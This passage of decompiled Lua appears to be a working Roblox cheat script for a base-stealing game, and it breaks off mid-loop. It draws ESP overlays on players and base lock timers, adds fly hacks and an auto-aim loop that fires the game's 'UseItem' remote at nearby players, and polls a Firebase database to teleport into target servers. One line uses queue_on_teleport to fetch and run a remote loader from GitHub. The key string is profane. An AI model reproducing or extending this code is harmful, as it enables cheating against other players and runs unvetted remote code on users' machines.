    local v989_ = workspace.CurrentCamera
    if _G.FloatV1 and v988_ then
        v988_.Velocity = v989_.CFrame.LookVector * 25
    end
end)
task.spawn(function()
    local v990_ = game:GetService("Players")
    local v_u_991_ = v990_.LocalPlayer
    local v_u_992_ = {}
    local v_u_993_ = {}
    local v_u_994_ = {}
    local v_u_995_ = {}
    local function v_u_1002_(p996_)
		-- upvalues: (ref) v_u_992_
        local v_u_997_ = v_u_992_[p996_]
        if v_u_997_ then
            if v_u_997_.conns then
                local v998_, v999_, v1000_ = ipairs(v_u_997_.conns)
                while true do
                    local v_u_1001_
                    v1000_, v_u_1001_ = v998_(v999_, v1000_)
                    if v1000_ == nil then
                        break
                    end
                    pcall(function()
						-- upvalues: (ref) v_u_1001_
                        v_u_1001_:Disconnect()
                    end)
                end
            end
            if v_u_997_.highlight then
                pcall(function()
					-- upvalues: (ref) v_u_997_
                    v_u_997_.highlight:Destroy()
                end)
            end
            if v_u_997_.billboard then
                pcall(function()
					-- upvalues: (ref) v_u_997_
                    v_u_997_.billboard:Destroy()
                end)
            end
            v_u_992_[p996_] = nil
        end
    end
    local function v_u_1013_(p_u_1003_, p1004_)
		-- upvalues: (ref) v_u_992_, (ref) v_u_1002_
        if p_u_1003_ and not v_u_992_[p_u_1003_] then
            local v1005_ = Instance.new("Highlight")
            v1005_.Adornee = p_u_1003_
            v1005_.FillColor = _G.PlayerESPColor or Color3.fromRGB(0, 255, 0)
            v1005_.FillTransparency = 0.4
            v1005_.OutlineColor = Color3.fromRGB(255, 255, 255)
            v1005_.OutlineTransparency = 0.3
            v1005_.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
            v1005_.Parent = p_u_1003_
            local v1006_ = Instance.new("BillboardGui")
            v1006_.Adornee = p_u_1003_:FindFirstChild("HumanoidRootPart") or p_u_1003_:FindFirstChildWhichIsA("BasePart")
            v1006_.Size = UDim2.new(0, 120, 0, 33)
            v1006_.StudsOffset = Vector3.new(0, 3.5, 0)
            v1006_.AlwaysOnTop = true
            v1006_.ZIndexBehavior = Enum.ZIndexBehavior.Global
            v1006_.Parent = p_u_1003_
            local v1007_ = Instance.new("Frame")
            v1007_.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
            v1007_.BackgroundTransparency = 0.15
            v1007_.BorderSizePixel = 0
            v1007_.Size = UDim2.new(1, 0, 1, 0)
            v1007_.ZIndex = 1
            v1007_.Parent = v1006_
            local v1008_ = Instance.new("UICorner")
            v1008_.CornerRadius = UDim.new(0, 8)
            v1008_.Parent = v1007_
            local v1009_ = Instance.new("UIStroke")
            v1009_.Color = _G.PlayerESPColor or Color3.fromRGB(0, 255, 0)
            v1009_.Thickness = 1.2
            v1009_.Transparency = 0.5
            v1009_.Parent = v1007_
            local v1010_ = Instance.new("TextLabel")
            v1010_.Size = UDim2.new(1, - 8, 1, - 4)
            v1010_.Position = UDim2.new(0, 4, 0, 2)
            v1010_.BackgroundTransparency = 1
            v1010_.TextColor3 = Color3.fromRGB(255, 255, 255)
            v1010_.TextScaled = true
            v1010_.Font = Enum.Font.GothamMedium
            v1010_.TextStrokeTransparency = 0.65
            v1010_.Text = p1004_
            v1010_.ZIndex = 2
            v1010_.Parent = v1007_
            local v1012_ = {
                [# v1012_ + 1] = p_u_1003_.AncestryChanged:Connect(function(_, p1011_)
					-- upvalues: (ref) v_u_1002_, (ref) p_u_1003_
                    if not p1011_ then
                        v_u_1002_(p_u_1003_)
                    end
                end)
            }
            v_u_992_[p_u_1003_] = {
                ["highlight"] = v1005_,
                ["billboard"] = v1006_,
                ["conns"] = v1012_,
                ["label"] = v1010_,
                ["stroke"] = v1009_
            }
        end
    end
    local function v_u_1016_(p_u_1014_)
		-- upvalues: (ref) v_u_993_, (ref) v_u_1013_
        if not v_u_993_[p_u_1014_] then
            v_u_993_[p_u_1014_] = {}
            v_u_993_[p_u_1014_][# v_u_993_[p_u_1014_] + 1] = p_u_1014_.CharacterAdded:Connect(function(p1015_)
				-- upvalues: (ref) v_u_1013_, (ref) p_u_1014_
                if _G.PlayerESP then
                    v_u_1013_(p1015_, p_u_1014_.DisplayName)
                end
            end)
            if p_u_1014_.Character and _G.PlayerESP then
                v_u_1013_(p_u_1014_.Character, p_u_1014_.DisplayName)
            end
        end
    end
    local function v1029_()
		-- upvalues: (ref) v_u_993_, (ref) v_u_992_, (ref) v_u_1002_
        local v1017_, v1018_, v1019_ = pairs(v_u_993_)
        while true do
            local v1020_, v1021_ = v1017_(v1018_, v1019_)
            if v1020_ == nil then
                break
            end
            local v1022_, v1023_, v1024_ = ipairs(v1021_)
            v1019_ = v1020_
            while true do
                local v_u_1025_
                v1024_, v_u_1025_ = v1022_(v1023_, v1024_)
                if v1024_ == nil then
                    break
                end
                pcall(function()
					-- upvalues: (ref) v_u_1025_
                    v_u_1025_:Disconnect()
                end)
            end
            v_u_993_[v1020_] = nil
        end
        local v1026_, v1027_, v1028_ = pairs(v_u_992_)
        while true do
            v1028_ = v1026_(v1027_, v1028_)
            if v1028_ == nil then
                break
            end
            v_u_1002_(v1028_)
        end
    end
    local function v_u_1038_(p1030_, p1031_, p1032_)
        local v1033_ = Instance.new("BillboardGui")
        v1033_.Adornee = p1030_
        v1033_.Size = UDim2.new(0, 110, 0, 28)
        v1033_.AlwaysOnTop = true
        v1033_.ZIndexBehavior = Enum.ZIndexBehavior.Global
        v1033_.Parent = p1030_
        local v1034_ = Instance.new("Frame")
        v1034_.BackgroundTransparency = 0.1
        v1034_.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
        v1034_.BorderSizePixel = 0
        v1034_.Size = UDim2.new(1, 0, 1, 0)
        v1034_.ZIndex = 5
        v1034_.Parent = v1033_
        local v1035_ = Instance.new("UICorner")
        v1035_.CornerRadius = UDim.new(0, 6)
        v1035_.Parent = v1034_
        local v1036_ = Instance.new("UIStroke")
        v1036_.Color = p1031_
        v1036_.Thickness = 1
        v1036_.Transparency = 0.4
        v1036_.Parent = v1034_
        local v1037_ = Instance.new("TextLabel")
        v1037_.Size = UDim2.new(1, - 6, 1, - 4)
        v1037_.Position = UDim2.new(0, 3, 0, 2)
        v1037_.BackgroundTransparency = 1
        v1037_.TextColor3 = p1031_
        v1037_.TextStrokeTransparency = 0.7
        v1037_.Font = Enum.Font.Gotham
        v1037_.TextScaled = true
        v1037_.Text = p1032_
        v1037_.ZIndex = 6
        v1037_.Parent = v1034_
        return v1033_, v1037_, v1036_
    end
    local function v_u_1049_(p1039_)
		-- upvalues: (ref) v_u_994_, (ref) v_u_1038_
        if v_u_994_[p1039_] then
            return
        else
            local v1040_ = p1039_:FindFirstChild("PlotSign")
            if v1040_ then
                local v1041_ = v1040_:FindFirstChildWhichIsA("SurfaceGui") and v1040_.SurfaceGui:FindFirstChild("Frame")
                if v1041_ then
                    v1041_ = v1040_.SurfaceGui.Frame:FindFirstChild("TextLabel")
                end
                if v1041_ and v1041_.Text == "Empty Base" then
                    return
                else
                    local v1042_ = p1039_:FindFirstChild("Purchases") and p1039_.Purchases:FindFirstChild("PlotBlock")
                    if v1042_ then
                        v1042_ = p1039_.Purchases.PlotBlock:FindFirstChild("Main")
                    end
                    if v1042_ then
                        local v1043_ = Instance.new("Attachment")
                        v1043_.Parent = v1042_
                        local v1044_ = v1042_.Position.X
                        local v1045_ = math.abs(v1044_ - - 302) < math.abs(v1044_ - - 518) and - 302 or - 518
                        v1043_.WorldPosition = Vector3.new(v1045_, - 4, v1042_.Position.Z)
                        local v1046_, v1047_, v1048_ = v_u_1038_(v1043_, Color3.fromRGB(100, 255, 100), "")
                        v_u_994_[p1039_] = {
                            ["gui"] = v1046_,
                            ["label"] = v1047_,
                            ["attachment"] = v1043_,
                            ["stroke"] = v1048_
                        }
                    end
                end
            else
                return
            end
        end
    end
    local function v_u_1051_(p1050_)
		-- upvalues: (ref) v_u_994_, (ref) v_u_995_
        if v_u_994_[p1050_] then
            if v_u_994_[p1050_].gui then
                v_u_994_[p1050_].gui:Destroy()
            end
            if v_u_994_[p1050_].attachment then
                v_u_994_[p1050_].attachment:Destroy()
            end
            v_u_994_[p1050_] = nil
            v_u_995_[p1050_] = nil
        end
    end
    local function v_u_1064_()
		-- upvalues: (ref) v_u_994_, (ref) v_u_1051_, (ref) v_u_1049_, (ref) v_u_995_
        if workspace:FindFirstChild("Plots") then
            if _G.BaseESP then
                local v1052_, v1053_, v1054_ = pairs(workspace.Plots:GetChildren())
                while true do
                    local v1055_
                    v1054_, v1055_ = v1052_(v1053_, v1054_)
                    if v1054_ == nil then
                        break
                    end
                    if v1055_:FindFirstChild("Purchases") and v1055_.Purchases:FindFirstChild("PlotBlock") then
                        v_u_1049_(v1055_)
                        local v1056_ = v_u_994_[v1055_]
                        if v1056_ then
                            local v1057_ = v1055_.Purchases.PlotBlock.Main
                            local v1058_ = v1057_:FindFirstChild("BillboardGui")
                            if v1058_ then
                                v1058_ = v1057_.BillboardGui:FindFirstChild("Locked")
                            end
                            local v1059_ = v1057_:FindFirstChild("BillboardGui")
                            if v1059_ then
                                v1059_ = v1057_.BillboardGui:FindFirstChild("RemainingTime")
                            end
                            local v1060_ = v1059_ and v1059_.Text or "??"
                            if v1058_ and v1058_.Text == "Locked:" then
                                if v_u_995_[v1055_] and v_u_995_[v1055_].value == v1060_ then
                                    v_u_995_[v1055_].counter = v_u_995_[v1055_].counter + 0.2
                                else
                                    v_u_995_[v1055_] = {
                                        ["value"] = v1060_,
                                        ["counter"] = 0
                                    }
                                end
                                if v_u_995_[v1055_].counter < 1.25 then
                                    v1056_.label.Text = v1060_
                                    v1056_.label.TextColor3 = Color3.fromRGB(255, 100, 100)
                                    v1056_.stroke.Color = Color3.fromRGB(255, 100, 100)
                                else
                                    v1056_.label.Text = "OPEN"
                                    v1056_.label.TextColor3 = Color3.fromRGB(100, 255, 100)
                                    v1056_.stroke.Color = Color3.fromRGB(100, 255, 100)
                                end
                            else
                                v1056_.label.Text = "OPEN"
                                v1056_.label.TextColor3 = Color3.fromRGB(100, 255, 100)
                                v1056_.stroke.Color = Color3.fromRGB(100, 255, 100)
                                v_u_995_[v1055_] = {
                                    ["value"] = "OPEN",
                                    ["counter"] = 0
                                }
                            end
                        end
                    end
                end
            else
                local v1061_, v1062_, v1063_ = pairs(v_u_994_)
                while true do
                    v1063_ = v1061_(v1062_, v1063_)
                    if v1063_ == nil then
                        break
                    end
                    v_u_1051_(v1063_)
                end
            end
        else
            return
        end
    end
    local function v_u_1072_()
		-- upvalues: (ref) v_u_994_, (ref) v_u_1051_, (ref) v_u_1064_
        if _G.BaseESP then
            local v1065_, v1066_, v1067_ = pairs(workspace.Plots:GetChildren())
            while true do
                local v1068_
                v1067_, v1068_ = v1065_(v1066_, v1067_)
                if v1067_ == nil then
                    break
                end
                v_u_1051_(v1068_)
            end
            v_u_1064_()
        else
            local v1069_, v1070_, v1071_ = pairs(v_u_994_)
            while true do
                v1071_ = v1069_(v1070_, v1071_)
                if v1071_ == nil then
                    break
                end
                v_u_1051_(v1071_)
            end
        end
    end
    v990_.PlayerAdded:Connect(function(p1073_)
		-- upvalues: (ref) v_u_991_, (ref) v_u_1016_, (ref) v_u_1072_
        if p1073_ ~= v_u_991_ then
            v_u_1016_(p1073_)
        end
        task.wait(0.1)
        v_u_1072_()
    end)
    v990_.PlayerRemoving:Connect(function()
		-- upvalues: (ref) v_u_1072_
        task.wait(0.1)
        v_u_1072_()
    end)
    local v1074_, v1075_, v1076_
    if workspace:FindFirstChild("Plots") then
        workspace.Plots.ChildAdded:Connect(function()
			-- upvalues: (ref) v_u_1072_
            task.wait(0.1)
            v_u_1072_()
        end)
        workspace.Plots.ChildRemoved:Connect(function()
			-- upvalues: (ref) v_u_1072_
            task.wait(0.1)
            v_u_1072_()
        end)
        v1074_ = v_u_992_
        v1075_ = v_u_1016_
        v1076_ = v_u_991_
    else
        v1074_ = v_u_992_
        v1075_ = v_u_1016_
        v1076_ = v_u_991_
    end
    while task.wait(0.2) do
        if _G.PlayerESP then
            local v1077_, v1078_, v1079_ = ipairs(v990_:GetPlayers())
            while true do
                local v1080_
                v1079_, v1080_ = v1077_(v1078_, v1079_)
                if v1079_ == nil then
                    break
                end
                if v1080_ ~= v1076_ then
                    v1075_(v1080_)
                end
            end
            local v1081_, v1082_, v1083_ = pairs(v1074_)
            while true do
                local v1084_
                v1083_, v1084_ = v1081_(v1082_, v1083_)
                if v1083_ == nil then
                    break
                end
                if v1084_.highlight then
                    v1084_.highlight.FillColor = _G.PlayerESPColor or Color3.fromRGB(0, 255, 0)
                end
                if v1084_.stroke then
                    v1084_.stroke.Color = _G.PlayerESPColor or Color3.fromRGB(0, 255, 0)
                end
            end
        else
            v1029_()
        end
        v_u_1064_()
    end
end)
local v_u_1085_ = nil
local v_u_1086_ = nil
local v_u_1087_ = game:GetService("Players")
local v_u_1088_ = game:GetService("ReplicatedStorage")
local v1089_ = game:GetService("RunService")
local v_u_1090_ = v_u_1087_.LocalPlayer
local v_u_1091_ = workspace.CurrentCamera
local v_u_1092_ = nil
local v_u_1093_ = nil
local function v_u_1097_()
	-- upvalues: (ref) v_u_1090_, (ref) v_u_1092_, (ref) v_u_1093_
    local v1094_ = v_u_1090_.Character
    if v1094_ and v1094_.Parent then
        v_u_1092_ = v1094_:WaitForChild("HumanoidRootPart")
        local v1095_, v1096_ = pcall(function()
			-- upvalues: (ref) v_u_1090_
            return require(v_u_1090_:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
        end)
        if v1095_ then
            v_u_1093_ = v1096_
        end
        return v1094_, v_u_1092_, v1094_:FindFirstChildOfClass("Humanoid")
    end
end
local function v_u_1103_()
	-- upvalues: (ref) v_u_1085_, (ref) v_u_1097_, (ref) v_u_1090_
    if not v_u_1085_ then
        v_u_1085_ = task.spawn(function()
			-- upvalues: (ref) v_u_1097_, (ref) v_u_1090_, (ref) v_u_1085_
            while _G.Fly do
                local v1098_, v1099_, v_u_1100_ = v_u_1097_()
                if v1098_ and (v1099_ and v_u_1100_) then
                    local v1101_ = v_u_1090_:FindFirstChild("Backpack")
                    local v_u_1102_ = v1101_ and (not v1098_:FindFirstChild("Grapple Hook") and v1101_:FindFirstChild("Grapple Hook"))
                    if v_u_1102_ then
                        pcall(function()
							-- upvalues: (ref) v_u_1100_, (ref) v_u_1102_
                            v_u_1100_:EquipTool(v_u_1102_)
                        end)
                    end
                end
                task.wait(0.005)
            end
            v_u_1085_ = nil
        end)
    end
end
local function v_u_1105_()
	-- upvalues: (ref) v_u_1086_, (ref) v_u_1088_
    if not v_u_1086_ then
        v_u_1086_ = task.spawn(function()
			-- upvalues: (ref) v_u_1088_, (ref) v_u_1086_
            while _G.Fly do
                pcall(function()
					-- upvalues: (ref) v_u_1088_
                    local v1104_ = v_u_1088_:FindFirstChild("Packages")
                    if v1104_ then
                        require(v1104_:WaitForChild("Net")):RemoteEvent("UseItem"):FireServer(1.9832406361897787)
                    end
                end)
                task.wait(0.05)
            end
            v_u_1086_ = nil
        end)
    end
end
local function v1106_()
	-- upvalues: (ref) v_u_1097_
    v_u_1097_()
end
v_u_1090_.CharacterAdded:Connect(v1106_)
if v_u_1090_.Character then
    v_u_1097_()
end
v1089_.RenderStepped:Connect(function()
	-- upvalues: (ref) v_u_1092_, (ref) v_u_1093_, (ref) v_u_1091_
    if _G.Fly and (v_u_1092_ and v_u_1093_) then
        local v1107_ = v_u_1093_:GetMoveVector()
        local v_u_1108_ = Vector3.new(0, 0, 0)
        if v1107_.X ~= 0 then
            v_u_1108_ = v_u_1108_ + v_u_1091_.CFrame.RightVector * v1107_.X * _G.FlySpeed
        end
        if v1107_.Z ~= 0 then
            v_u_1108_ = v_u_1108_ - v_u_1091_.CFrame.LookVector * v1107_.Z * _G.FlySpeed
        end
        pcall(function()
			-- upvalues: (ref) v_u_1092_, (ref) v_u_1108_
            v_u_1092_.AssemblyLinearVelocity = v_u_1108_
        end)
    end
end)
task.spawn(function()
	-- upvalues: (ref) v_u_1085_, (ref) v_u_1103_, (ref) v_u_1086_, (ref) v_u_1105_
    while true do
        if _G.Fly then
            if not v_u_1085_ then
                v_u_1103_()
            end
            if not v_u_1086_ then
                v_u_1105_()
            end
        else
            if v_u_1085_ then
                task.cancel(v_u_1085_)
                v_u_1085_ = nil
            end
            if v_u_1086_ then
                task.cancel(v_u_1086_)
                v_u_1086_ = nil
            end
        end
        task.wait(0.2)
    end
end)
local v_u_1109_ = game:GetService("Players").LocalPlayer
local v1110_ = v_u_1088_
local v_u_1111_ = v_u_1088_.FindFirstChild(v1110_, "Packages") and v_u_1088_.Packages:FindFirstChild("Net")
if v_u_1111_ then
    v_u_1111_ = v_u_1088_.Packages.Net:FindFirstChild("RE/UseItem")
end
local v_u_1112_ = nil
local function v_u_1116_()
	-- upvalues: (ref) v_u_1109_
    local v1113_ = v_u_1109_.Character
    if not v1113_ then
        return false
    end
    local v1114_ = v1113_:FindFirstChild("Laser Cape") or v_u_1109_.Backpack:FindFirstChild("Laser Cape")
    if not v1114_ then
        return false
    end
    local v1115_ = v1113_:FindFirstChildOfClass("Tool")
    if v1115_ and v1115_ ~= v1114_ then
        v1115_.Parent = v_u_1109_.Backpack
        task.wait(0.08)
    elseif v1115_ == v1114_ then
        return true
    end
    v1114_.Parent = v1113_
    task.wait(0.1)
    return true
end
local function v_u_1136_(p1117_)
	-- upvalues: (ref) v_u_1087_, (ref) v_u_1109_
    local v1118_ = math.huge
    local v1119_ = v_u_1087_
    local v1120_, v1121_, v1122_ = ipairs(v1119_:GetPlayers())
    local v1123_ = nil
    local v1124_ = nil
    local v1125_ = nil
    while true do
        local v1126_
        v1122_, v1126_ = v1120_(v1121_, v1122_)
        if v1122_ == nil then
            break
        end
        if v1126_ ~= v_u_1109_ and v1126_.Character then
            local v1127_, v1128_, v1129_ = ipairs(v1126_.Character:GetChildren())
            local v1130_ = 0
            local v1131_ = nil
            while true do
                local v1132_
                v1129_, v1132_ = v1127_(v1128_, v1129_)
                if v1129_ == nil then
                    break
                end
                if v1132_:IsA("BasePart") then
                    local v1133_ = v1132_.Size.X * v1132_.Size.Y * v1132_.Size.Z
                    if v1130_ < v1133_ then
                        v1131_ = v1132_
                        v1130_ = v1133_
                    end
                end
            end
            if v1131_ then
                local v1134_ = v1131_.Position
                local v1135_ = (v1134_ - p1117_.Position).Magnitude
                if v1135_ <= (_G.LaserRange or 50) then
                    if v1135_ < v1118_ then
                        v1125_ = v1131_
                        v1124_ = v1134_
                        v1123_ = v1126_
                        v1118_ = v1135_
                    end
                end
            end
        end
    end
    return v1123_, v1124_, v1125_, v1118_
end
local function v_u_1138_(p1137_)
	-- upvalues: (ref) v_u_1112_
    if _G.LaserCape then
        if p1137_ then
            if not v_u_1112_ then
                v_u_1112_ = Instance.new("CylinderHandleAdornment")
                v_u_1112_.Name = "LaserCapeAdornment"
                v_u_1112_.Color3 = Color3.fromRGB(255, 0, 0)
                v_u_1112_.Adornee = workspace.Terrain
                v_u_1112_.AlwaysOnTop = true
                v_u_1112_.Height = 1
                v_u_1112_.Radius = _G.LaserRange or 50
                v_u_1112_.Transparency = 0.25
                v_u_1112_.ZIndex = 2
                v_u_1112_.Parent = workspace
                v_u_1112_.Visible = true
                v_u_1112_.InnerRadius = math.max(0, (_G.LaserRange or 50) - 3)
            end
            v_u_1112_.Adornee = workspace.Terrain
            v_u_1112_.Radius = _G.LaserRange or 50
            v_u_1112_.InnerRadius = math.max(0, (_G.LaserRange or 50) - 3)
            v_u_1112_.Height = 1
            v_u_1112_.Transparency = 0.25
            v_u_1112_.Color3 = Color3.fromRGB(255, 0, 0)
            v_u_1112_.AlwaysOnTop = true
            v_u_1112_.Visible = true
            v_u_1112_.CFrame = CFrame.new(p1137_.Position) * CFrame.Angles(math.rad(90), 0, 0)
        end
    else
        if v_u_1112_ then
            v_u_1112_.Visible = false
        end
        return
    end
end
v1089_.Heartbeat:Connect(function()
	-- upvalues: (ref) v_u_1112_, (ref) v_u_1109_, (ref) v_u_1138_, (ref) v_u_1136_, (ref) v_u_1116_, (ref) v_u_1111_, (ref) v_u_1088_
    if _G.LaserCape then
        local v1139_ = v_u_1109_.Character
        local v1140_
        if v1139_ then
            v1140_ = v1139_:FindFirstChild("UpperTorso") or v1139_:FindFirstChild("HumanoidRootPart") or nil
        else
            v1140_ = nil
        end
        if v1140_ then
            v_u_1138_(v1140_)
            local v1141_, v_u_1142_, v_u_1143_ = v_u_1136_(v1140_)
            if v1141_ then
                v_u_1116_()
                pcall(function()
					-- upvalues: (ref) v_u_1111_, (ref) v_u_1142_, (ref) v_u_1143_, (ref) v_u_1088_
                    if v_u_1111_ and (v_u_1142_ and v_u_1143_) then
                        v_u_1111_:FireServer(v_u_1142_, v_u_1143_)
                    else
                        local v_u_1144_ = v_u_1088_:FindFirstChild("Packages")
                        if v_u_1144_ then
                            local v1146_, v1147_ = pcall(function()
								-- upvalues: (ref) v_u_1144_
                                local v1145_ = v_u_1144_
                                return require(v1145_:WaitForChild("Net"))
                            end)
                            if v1146_ and v1147_ then
                                local v1148_ = v1147_:RemoteEvent("UseItem")
                                if v1148_ and (v_u_1142_ and v_u_1143_) then
                                    v1148_:FireServer(v_u_1142_, v_u_1143_)
                                end
                            end
                        end
                    end
                end)
            end
        end
    else
        if v_u_1112_ then
            v_u_1112_.Visible = false
        end
        return
    end
end)
v_u_1109_.CharacterAdded:Connect(function()
    task.wait(1)
end)
task.spawn(function()
    local v_u_1149_ = game:GetService("HttpService")
    local v_u_1150_ = game:GetService("TeleportService")
    local v1151_ = game:GetService("Players")
    local v_u_1152_ = request or http_request or (syn.request or http.request)
    local v_u_1153_ = v1151_.LocalPlayer
    local v_u_1154_ = "FCKUGUY-FUCKUMOMTOO"
-- 
    local v_u_1155_ = "https://fkcuguy-default-rtdb.firebaseio.com/"
    local function v1166_(p1156_)
		-- upvalues: (ref) v_u_1154_
        local v1157_ = 96
        if # p1156_ <= v1157_ * 2 then
            return nil
        end
        local v1158_ = p1156_:sub(v1157_ + 1, # p1156_ - v1157_)
        local v1159_ = # v_u_1154_
        local v1160_ = ""
        for v1161_ = 1, # v1158_, 2 do
            local v1162_ = v1158_:sub(v1161_, v1161_ + 1)
            local v1163_ = tonumber(v1162_, 16)
            if not v1163_ then
                return nil
            end
            local v1164_ = string.byte(v_u_1154_, (v1161_ - 1) / 2 % v1159_ + 1)
            local v1165_ = bit32.bxor(v1163_, v1164_)
            v1160_ = v1160_ .. string.char(v1165_)
        end
        return v1160_
    end
    local function v1169_()
		-- upvalues: (ref) v_u_1152_, (ref) v_u_1155_, (ref) v_u_1149_
        local v1167_, v1168_ = pcall(function()
			-- upvalues: (ref) v_u_1152_, (ref) v_u_1155_
            return v_u_1152_({
                ["Url"] = v_u_1155_ .. "/Brains.json",
                ["Method"] = "GET"
            })
        end)
        if v1167_ and v1168_.StatusCode == 200 then
            local _ = v_u_1149_.JSONDecode
            local _ = v1168_.Body
        end
    end
    local function v_u_1171_(p_u_1170_)
		-- upvalues: (ref) v_u_1152_, (ref) v_u_1155_
        pcall(function()
			-- upvalues: (ref) v_u_1152_, (ref) v_u_1155_, (ref) p_u_1170_
            v_u_1152_({
                ["Url"] = v_u_1155_ .. "/Brains/" .. p_u_1170_ .. ".json",
                ["Method"] = "DELETE"
            })
        end)
    end
    local function v_u_1177_(p1172_, p1173_)
        local v_u_1174_ = Instance.new("ScreenGui")
        v_u_1174_.Name = "screenGui"
        v_u_1174_.IgnoreGuiInset = true
        v_u_1174_.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        v_u_1174_.ResetOnSpawn = false
        local v1175_ = Instance.new("Frame")
        v1175_.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        v1175_.Size = UDim2.new(1, 0, 1, 0)
        v1175_.Parent = v_u_1174_
        local v1176_ = Instance.new("TextLabel")
        v1176_.Size = UDim2.new(1, 0, 1, 0)
        v1176_.BackgroundTransparency = 1
        v1176_.Text = "Brainrot Target: " .. (p1173_ or "Unknown") .. " | " .. (p1172_ or "0")
        v1176_.TextScaled = false
        v1176_.TextSize = 40
        v1176_.TextColor3 = Color3.fromRGB(255, 255, 255)
        v1176_.Font = Enum.Font.GothamBold
        v1176_.Parent = v1175_
        v_u_1174_.Parent = game:GetService("CoreGui")
        task.spawn(function()
			-- upvalues: (ref) v_u_1174_
            task.wait(1.5)
            if v_u_1174_ and v_u_1174_.Parent then
                v_u_1174_:Destroy()
            end
        end)
    end
    local function v1183_(p_u_1178_, p_u_1179_, p1180_, p1181_, p1182_)
		-- upvalues: (ref) v_u_1177_, (ref) v_u_1150_, (ref) v_u_1153_, (ref) v_u_1171_
        if not p_u_1178_ or p_u_1178_ == game.JobId then
            return false
        end
        v_u_1177_(p1180_, p1181_)
        if _G.Joiner.Exec then
            if syn and syn.queue_on_teleport then
                syn.queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/LucasggkX/LKZ-Hub/refs/heads/main/Loader.lua\"))()")
            elseif queue_on_teleport then
                queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/LucasggkX/LKZ-Hub/refs/heads/main/Loader.lua\"))()")
            end
        end
        if not p_u_1179_ then
            return false
        end
        if not pcall(function()
			-- upvalues: (ref) v_u_1150_, (ref) p_u_1179_, (ref) p_u_1178_, (ref) v_u_1153_
            v_u_1150_:TeleportToPlaceInstance(p_u_1179_, p_u_1178_, v_u_1153_)
        end) then
            return false
        end
        v_u_1171_(p1182_)
        return true
    end
    while task.wait(0.5) do
        if _G.Joiner.State then
            local v1184_ = v1169_()
            if v1184_ then
                local v1185_ = os.time()
                local v1186_, v1187_, v1188_ = pairs(v1184_)
                local v1189_ = 0
                local v1190_ = nil
                local v1191_ = nil
                while true do
                    local v1192_
                    v1188_, v1192_ = v1186_(v1187_, v1188_)
                    if v1188_ == nil then
                        break
                    end
                    if v1192_ and (v1192_.Timestamp and (math.abs(v1185_ - v1192_.Timestamp) <= 5 and (v1192_.Value and (v1192_.JobId and v1192_.ServerId)))) then
                        local v1193_ = v1166_(v1192_.JobId)
                        if v1193_ and (v1192_.Value >= _G.Joiner.Min and (v1192_.Value <= _G.Joiner.Max and (v1189_ < v1192_.Value and v1193_ ~= game.JobId))) then
                            v1189_ = v1192_.Value
                            v1192_.RealJobId = v1193_
                            v1191_ = v1188_
                            v1190_ = v1192_
                        end
                    end
                end
                if v1190_ and v1191_ then
                    v1183_(v1190_.RealJobId, v1190_.ServerId, v1190_.RealValue or tostring(v1190_.Value), v1190_.Name or "Unknown", v1191_)
                end
            end
        end
    end
end)
task.spawn(function()
    local v_u_1194_ = game:GetService("Players").LocalPlayer
    local v1195_ = v_u_1194_
    local v1196_ = v_u_1194_.WaitForChild(v1195_, "PlayerGui")
    local function v_u_1198_(p1197_)
        return p1197_:gsub("<.->", "")
    end
    local function v_u_1204_(p_u_1199_)
		-- upvalues: (ref) v_u_1198_, (ref) v_u_1194_
        if _G.KickOnSteal then
            local v1200_, v1201_ = pcall(function()
				-- upvalues: (ref) p_u_1199_
                return p_u_1199_.Text
            end)
            if v1200_ and (typeof(v1201_) == "string" and v1201_ ~= "") then
                local v1202_ = v_u_1198_(v1201_)
                local v1203_ = string.lower(v1202_)
                if string.find(v1203_, "you stole", 1, true) then
                    v_u_1194_:Kick(v1202_)
                end
            end
        end
    end
    local function v_u_1213_(p1205_)
		-- upvalues: (ref) v_u_1204_
        local v1206_, v1207_, v1208_ = ipairs(p1205_:GetDescendants())
        while true do
            local v_u_1209_
            v1208_, v_u_1209_ = v1206_(v1207_, v1208_)
            if v1208_ == nil then
                break
            end
            v_u_1204_(v_u_1209_)
            v_u_1209_.Changed:Connect(function(p1210_)
				-- upvalues: (ref) v_u_1204_, (ref) v_u_1209_
                if p1210_ == "Text" then
                    v_u_1204_(v_u_1209_)
                end
            end)
        end
        p1205_.DescendantAdded:Connect(function(p_u_1211_)
			-- upvalues: (ref) v_u_1204_
            v_u_1204_(p_u_1211_)
            p_u_1211_.Changed:Connect(function(p1212_)
				-- upvalues: (ref) v_u_1204_, (ref) p_u_1211_
                if p1212_ == "Text" then
                    v_u_1204_(p_u_1211_)
                end
            end)
        end)
    end
    local v1214_, v1215_, v1216_ = ipairs(v1196_:GetChildren())
    while true do
        local v1217_
        v1216_, v1217_ = v1214_(v1215_, v1216_)
        if v1216_ == nil then
            break
        end
        v_u_1213_(v1217_)
    end
    v1196_.ChildAdded:Connect(function(p1218_)
		-- upvalues: (ref) v_u_1213_
        v_u_1213_(p1218_)
    end)
end)
task.spawn(function()
    local v1219_ = game.Players.LocalPlayer
    local function v1225_(p1220_)
        local v1221_, v1222_, v1223_ = ipairs(p1220_:GetDescendants())
        while true do
            local v1224_
            v1223_, v1224_ = v1221_(v1222_, v1223_)
            if v1223_ == nil then
                break
            end
            if v1224_:IsA("TextLabel") or v1224_:IsA("TextButton") then
                v1224_.TextTransparency = 1
                v1224_.TextStrokeTransparency = 1
                v1224_.BackgroundTransparency = 1
            elseif v1224_:IsA("ImageLabel") or v1224_:IsA("ImageButton") then
                v1224_.ImageTransparency = 1
                v1224_.BackgroundTransparency = 1
            elseif v1224_:IsA("Frame") then
                v1224_.BackgroundTransparency = 1
            end
        end
    end
    while true do
        local v_u_1226_ = false
        local function v1227_()
			-- upvalues: (ref) v_u_1226_
            v_u_1226_ = true
        end
        task.wait(0.01)
        if _G.DestroySentry then
            local v1228_ = v1219_.Character
            if v1228_ then
                local v1229_ = v1228_:FindFirstChild("HumanoidRootPart")
                local v1230_ = v1228_:FindFirstChild("Humanoid")
                if v1229_ and v1230_ then
                    local v1231_ = v1219_.UserId
                    local v1232_, v1233_, v1234_ = ipairs(workspace:GetChildren())
                    while true do
                        local v1235_
